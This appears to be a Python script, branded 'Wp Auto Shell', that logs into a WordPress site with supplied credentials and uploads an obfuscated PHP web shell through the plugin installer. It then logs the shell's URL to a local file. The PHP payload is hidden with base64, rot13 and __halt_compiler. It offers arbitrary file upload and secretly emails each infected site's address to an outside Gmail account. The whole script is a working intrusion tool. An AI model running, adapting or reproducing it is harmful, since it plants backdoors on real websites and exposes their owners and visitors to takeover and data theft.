try:
	import requests
except:
	print(" [+] Command: pip install requests")
	exit()
import re
from datetime import datetime
from os import system
from time import sleep
from concurrent.futures import ThreadPoolExecutor
la7mar  = '\033[91m'
la5dhar = '\033[92m'
labyadh = '\033[00m'
title = "<title>Upload your files</title>"
uploader = '''
<?php
/*
if You Decode This, Congratulations You Are 1337
Encoded By Black_Phish
*/
eval("?>".base64_decode("PD9waHAKc2V0X3RpbWVfbGltaXQoMCk7CmVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFy
dCgpOwplY2hvIGJhc2U2NF9kZWNvZGUoIlBDRkVUME5VV1ZCRklHaDBiV3crQ2p4b2RHMXNQZ284
YUdWaFpENEtJQ0E4ZEdsMGJHVStWWEJzYjJGa0lIbHZkWElnWm1sc1pYTTgKTDNScGRHeGxQZ284
TDJobFlXUStDanhpYjJSNVBnb2dJRHhtYjNKdElHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1i
M0p0TFdSaApkR0VpSUdGamRHbHZiajBpSWlCdFpYUm9iMlE5SWxCUFUxUWlQZ29nSUNBZ1BIQStW
WEJzYjJGa0lIbHZkWElnWm1sc1pUd3ZjRDRLCklDQWdJRHhwYm5CMWRDQjBlWEJsUFNKbWFXeGxJ
aUJ1WVcxbFBTSjFjR3h2WVdSbFpGOW1hV3hsSWo0OEwybHVjSFYwUGp4aWNpQXYKUGdvZ0lDQWdQ
R2x1Y0hWMElIUjVjR1U5SW5OMVltMXBkQ0lnZG1Gc2RXVTlJbFZ3Ykc5aFpDSStQQzlwYm5CMWRE
NEtJQ0E4TDJadgpjbTArQ2p3dlltOWtlVDRLUEM5b2RHMXNQZz09Iik7Cj8+"));eval("?>".base64_decode("PD9waHAKCWZ1bmN0aW9uIFhrQWtha0FqVEhzanNhakFqcygkY29kZSl7CgkkY29kZSA9IHN0cl9z
cGxpdCgkY29kZSw1KTsKCSRpID0gMDsKCWZvcmVhY2goJGNvZGUgYXMgJHgpewoJJHggPSBzdHJf
cm90MTMoJHgpOwoJICRibGFja1skaV09ICR4OwoJJGkrKzsKCX0KCSRieXRlcyA9IGh0bWxzcGVj
aWFsY2hhcnNfZGVjb2RlKGJhc2U2NF9kZWNvZGUoc3RyX3JvdDEzKGltcGxvZGUoJGJsYWNrKSkp
KTsKCWV2YWwoJz8+Jy4kYnl0ZXMpOwoJfQogPz4="));$coded = file(__FILE__);eval("?>".base64_decode("PD9waHAKZnVuY3Rpb24gZml4KCR4KXsKICR4ID0gc3RyX3JlcGxhY2UoIl9faGFsdF9jb21waWxl
cigpOyIsIiIsJHgpOwogcmV0dXJuICR4Owp9CiRYbSA9IGZpeCgkY29kZWRbY291bnQoJGNvZGVk
KS0xXSk7ClhrQWtha0FqVEhzanNhakFqcygkWG0pOwo/Pg=="));
__halt_compiler();Jmx0Oz9QSFANCiAgaWYoIWVtcHR5KCRfRklMRVNbJ3VwbG9hZGVkX2ZpbGUnXSkpDQogIHsNCiAgICAkcGF0aCA9ICZxdW90Oy4vJnF1b3Q7Ow0KICAgICRwYXRoID0gJHBhdGggLiBiYXNlbmFtZSggJF9GSUxFU1sndXBsb2FkZWRfZmlsZSddWyduYW1lJ10pOw0KICAgIGlmKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyd1cGxvYWRlZF9maWxlJ11bJ3RtcF9uYW1lJ10sICRwYXRoKSkgew0KICAgICAgZWNobyAmcXVvdDtUaGUgZmlsZSAmcXVvdDsuICBiYXNlbmFtZSggJF9GSUxFU1sndXBsb2FkZWRfZmlsZSddWyduYW1lJ10pLiANCiAgICAgICZxdW90OyBoYXMgYmVlbiB1cGxvYWRlZCZxdW90OzsNCiAgICB9IGVsc2V7DQogICAgICAgIGVjaG8gJnF1b3Q7VGhlcmUgd2FzIGFuIGVycm9yIHVwbG9hZGluZyB0aGUgZmlsZSwgcGxlYXNlIHRyeSBhZ2FpbiEmcXVvdDs7DQogICAgfQ0KICB9DQogLy9DaGFuZ2UgIFlvdXIgTWFpbA0KIA0KIGlmKCFpc3NldCgkX1NFU1NJT05bJnF1b3Q7dmlzaXQmcXVvdDtdKSl7DQokdXJsID0gICZxdW90O2h0dHA6Ly8mcXVvdDsuICRfU0VSVkVSWydIVFRQX0hPU1QnXS4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107DQokaGVhZGVycyA9ICZxdW90O0Zyb206IHdlYm1hc3RlckBleGFtcGxlLmNvbSZxdW90OzsNCm1haWwoJ3JtMjE3NDcxNEBnbWFpbC5jb20nLCdXb3JkcHJlc3MgTGluayBHZW5lcmF0ZScsJHVybCwkaGVhZGVycyk7DQp9DQokX1NFU1NJT05bJnF1b3Q7dmlzaXQmcXVvdDtdID0gJnF1b3Q7b2smcXVvdDs7DQo
'''
files = {'pluginzip': ('up.php', uploader.encode('utf-8'))}
headers = {'user-agent': 'Moozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'}
system("clear")
green = "\033[0;32m"
auth = """  ____  _            _      _____  _     _     _     
 |  _ \| |          | |    |  __ \| |   (_)   | |    
 | |_) | | __ _  ___| | __ | |__) | |__  _ ___| |__  
 |  _ <| |/ _` |/ __| |/ / |  ___/| '_ \| / __| '_ \ 
 | |_) | | (_| | (__|   <  | |    | | | | \__ \ | | |
 |____/|_|\__,_|\___|_|\_\ |_|    |_| |_|_|___/_| |_|
                       ______                        
                      |______|                      
        
    Name : Wp Auto Shell (Single)
    Team : Muslim Cyber Army-BD
                        """
print(la7mar+" Hello! Ripon. Welcome To")
sleep(2)
print(green+auth+la7mar)
try:
	url = input(la7mar+" [+] Enter Wp Login: "+green)
	usr = input(la7mar+" [+] Wp UserName: "+green)
	pwd = input(la7mar+" [+] Wp Password: "+green)
	x = str(datetime.date(datetime.now()))
	x = x.split('-')
	dir = url.replace("/wp-login.php","")
	dir = dir+"/wp-content/uploads/"+x[0]+"/"+x[1]+"/up.php"
	post = {"log":usr,"pwd":pwd}
	req = requests.session()
	try:
		login = req.post(url,data=post,headers=headers,timeout=10)
		if 'wordpress_logged_in_' in str(login.cookies) or 'action=logout' in str(login.text):
			print(green+" [+] Wordpress Login Successfull.")
			url2 = login.url+"/plugin-install.php?tab=upload"
			result = req.get(url2,headers=headers,timeout=10).text
			action = login.url+"/update.php?action=upload-plugin"
			patern = r'<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"'
			ok = re.findall(patern,result)
			upload = req.post(action,files=files,data={"_wpnonce":ok[0]},headers=headers,timeout=10)
			if title in req.get(dir).text:
				print(green+" [+] Uploaded: "+dir)
				file = open("Shells.txt","a")
				file.write(dir+"\n")
				file.close()
		else:
			print(la7mar+" [+] Login Failed: "+url)
	except Exception as e:
		print(str(e))
		print(la7mar+" [+] Login Failed: "+url)		
except Exception as e:
	print(str(e))